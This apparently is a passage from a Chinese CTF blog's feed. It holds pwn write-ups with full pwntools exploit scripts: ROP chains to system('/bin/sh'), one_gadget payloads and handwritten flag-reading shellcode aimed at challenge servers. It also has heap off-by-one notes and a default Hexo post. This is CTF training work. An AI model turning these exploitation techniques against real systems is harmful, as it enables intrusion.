class="line">libc_base = libc_addr  - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">0xe7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&#x27;a&#x27;</span> *<span class="number">0x28</span></span><br><span class="line">getshell += p64(libc_base + <span class="number">0x4f3d5</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;It is your turn: &#x27;</span>)</span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="letter（没搞懂"><a href="#letter（没搞懂" class="headerlink" title="letter（没搞懂"></a>letter（没搞懂</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307191837.png" alt="20210307191837"></p><p>程序禁用了一些系统调用，导致无法直接用 shellcode 直接getshell ，即 asm(shellcraft.sh())，所以得手写汇编 shellcode；因为程序是64位的，所以要写 context.arch = ‘amd64’</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307194929.png" alt="20210307194929"></p><p>负数溢出，但是没搞明白的是为什么是 -268376833 。。。。当事人非常郁闷</p><p>exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./letter&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-268376833&#x27;</span>)</span><br><span class="line"><span class="comment">#r.sendline(&#x27;a&#x27;*0x18+p64(0x60105c)+asm(shellcraft.sh()))</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x67616c66</span></span><br><span class="line"><span class="string">xor [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x60108C</span>)+asm(shellcode))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现其他师傅有另外的解法</p><p>exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">a,addr</span>):</span></span><br><span class="line">log.success(a+<span class="string">&#x27;====&gt;&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x400AA3</span></span><br><span class="line">p6 = <span class="number">0x400A9A</span></span><br><span class="line">mmmc = <span class="number">0x400A80</span></span><br><span class="line">vuln = <span class="number">0x400958</span></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./letter&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4009BB&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xffffffff</span>).ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(p6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(mmmc)+<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x4009DD</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.\n&#x27;</span>)</span><br><span class="line">write_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libcbase = write_leak - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)+asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>搞不懂控制 rbp 为 0x00601000+0x500+0x10 是为什么。。。。</p><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="rop-primary"><a href="#rop-primary" class="headerlink" title="rop_primary"></a>rop_primary</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195557.png" alt="20210309195557"></p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195620.png" alt="20210309195620"></p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195630.png" alt="20210309195630"></p><p>分析下来就是程序会给两个矩阵，我们要一个个输入两个矩阵相乘的结果来通过 check 函数，从而利用 vuln 去 rop</p><p>首先考的就是 python 功底，当然我是不太过关的。。。。</p><p>exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_matrix</span>():</span></span><br><span class="line">matrix = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">line = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip()    </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">row = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">row.append(<span class="built_in">int</span>(num))</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">        matrix.append(row)</span><br><span class="line"><span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_matrix</span>(<span class="params">a, b</span>):</span></span><br><span class="line">rows = <span class="built_in">len</span>(a)</span><br><span class="line">mid = <span class="built_in">len</span>(b)</span><br><span class="line">cols = <span class="built_in">len</span>(b[<span class="number">0</span>])</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">row = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mid):</span><br><span class="line">num += a[i][k] * b[k][j]</span><br><span class="line">row.append(num)</span><br><span class="line">result.append(row)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;A:\n&#x27;</span>)</span><br><span class="line">a = read_matrix()</span><br><span class="line">b = read_matrix()</span><br><span class="line"></span><br><span class="line">result = multi_matrix(a, b)</span><br></pre></td></tr></table></figure><p>之后就是简单的 rop 了</p><p>exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;zsh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;159.75.104.107&#x27;</span>,<span class="number">30372</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./rop_primary&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_matrix</span>():</span></span><br><span class="line">matrix = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">line = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip()    </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">row = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">row.append(<span class="built_in">int</span>(num))</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">        matrix.append(row)</span><br><span class="line"><span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_matrix</span>(<span class="params">a, b</span>):</span></span><br><span class="line">rows = <span class="built_in">len</span>(a)</span><br><span class="line">mid = <span class="built_in">len</span>(b)</span><br><span class="line">cols = <span class="built_in">len</span>(b[<span class="number">0</span>])</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">row = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mid):</span><br><span class="line">num += a[i][k] * b[k][j]</span><br><span class="line">row.append(num)</span><br><span class="line">result.append(row)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;A:\n&#x27;</span>)</span><br><span class="line">a = read_matrix()</span><br><span class="line">b = read_matrix()</span><br><span class="line"></span><br><span class="line">result = multi_matrix(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> row:</span><br><span class="line">p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop_primary&#x27;</span>)</span><br><span class="line">pus_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pus_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401613</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401611</span></span><br><span class="line">vuln_addr = <span class="number">0x000000000040157B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(pop_rdi) + p64(pus_got) + p64(pus_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;try your best\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">offset = puts_addr -  <span class="number">0x0875a0</span>    </span><br><span class="line">system_addr = offset + <span class="number">0x055410</span>   </span><br><span class="line">bin_sh = offset + <span class="number">0x1b75aa</span>        </span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;week1&quot;&gt;&lt;a href=&quot;#week1&quot; class=&quot;headerlink&quot; title=&quot;week1&quot;&gt;&lt;/a&gt;week1&lt;/h1&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://trick.ink/article/Hello%20World/"/>
    <id>https://trick.ink/article/Hello%20World/</id>
    <published>2021-09-28T19:45:18.580Z</published>
    <updated>2021-07-24T06:33:10.657Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! </p><span id="more"></span><p>This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! &lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Heap_Learn</title>
    <link href="https://trick.ink/article/Heap_Learn/"/>
    <id>https://trick.ink/article/Heap_Learn/</id>
    <published>2021-09-28T19:45:18.571Z</published>
    <updated>2021-07-24T06:33:32.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap-Learn"><a href="#Heap-Learn" class="headerlink" title="Heap_Learn"></a>Heap_Learn</h1><span id="more"></span><h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| prev_size |  size  |A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data(fd) | (bk)  |</span><br><span class="line">||</span><br><span class="line">||</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure><p><strong>prev_size</strong>，物理相邻的前一个chunk是空闲的话，则记录前一个chunk的大小（包括chunk头）；<br>                    若前一个chunk处于使用状态，则可以存储前一个chunk的数据。<strong>这是 chunk 中的空间复用</strong></p><p><strong>size</strong>，必须是 2 * SIZE_SZ 的整数倍。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p><ul><li>A：NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li></ul><ul><li><p>M：IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p></li><li><p>P：<strong>PREV_INUSE</strong>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul><p><strong>fd</strong>，<strong>bk</strong> 。chunk在分配状态下存储数据，在free了chunk之后：</p><ul><li>fd 指向下一个空闲的chunk（非物理相邻）</li><li>bk指向上一个空闲的chunk（非物理相邻）</li></ul><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞的产生与边界验证不严和字符串操作有关，包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p></li><li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p><p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p><p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code>     找到的块的大小与<code>prev_size</code> 是否一致。</p></li></ol><h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><p>当 large bin 中只存在一个chunk，那么该 chunk 的两个 nextsize指针都会指向自己</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Heap-Learn&quot;&gt;&lt;a href=&quot;#Heap-Learn&quot; class=&quot;headerlink&quot; title=&quot;Heap_Learn&quot;&gt;&lt;/a&gt;Heap_Learn&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="Heap" scheme="https://trick.ink/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_2021_3</title>
    <link href="https://trick.ink/article/DASCTF_2021_3/"/>
    <id>https://trick.ink/article/DASCTF_2021_3/</id>
    <published>2021-09-28T19:45:18.547Z</published>
    <updated>2021-07-24T06:35:25.709Z</updated>
    
    <content type="html"><![CDATA[<p>DASCTF 2021三月赛</p><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><p>保护全开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;trick&#x2F;Desktop&#x2F;fruitpie&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>IDA</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  LODWORD(size) = readInt(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Offset:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%llx&quot;</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v5[*(<span class="keyword">size_t</span> *)((<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>)], <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0xA0</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路</p><ul><li>获取libc_base：当申请一个足够大的堆时会由mmap分配，此时程序会给我们chunk的地址，而这个地址紧挨着libc并且偏移固定</li><li>将one_gadget写到realloc_hook地址中，在malloc_hook的地址写入realloc + 